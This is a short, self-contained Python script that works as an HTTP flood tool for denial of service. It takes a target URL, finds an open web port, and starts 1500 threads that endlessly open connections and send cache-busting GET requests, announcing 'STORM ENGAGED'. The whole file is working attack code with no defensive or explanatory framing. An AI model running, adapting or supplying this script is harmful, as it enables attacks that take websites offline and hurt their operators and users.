import socket, threading, random, time, ssl, sys, os
def get_target_info(raw_target):
    target = raw_target.replace("http://", "").replace("https://", "").replace("www.", "").split("/")[0]
    for p in [443, 80, 8080]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((target, p)) == 0: s.close(); return target, p
        except: continue
    return target, 80
def attack(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == 443: s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            pkt = f"GET /?{random.getrandbits(32)} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"
            s.send(pkt.encode()); s.close()
        except: pass
if __name__ == "__main__":
    host, port = get_target_info(sys.argv[1])
    print(f"[!] STORM ENGAGED: {host}:{port}")
    for i in range(1500): threading.Thread(target=attack, args=(host, port), daemon=True).start()
    while True: time.sleep(1)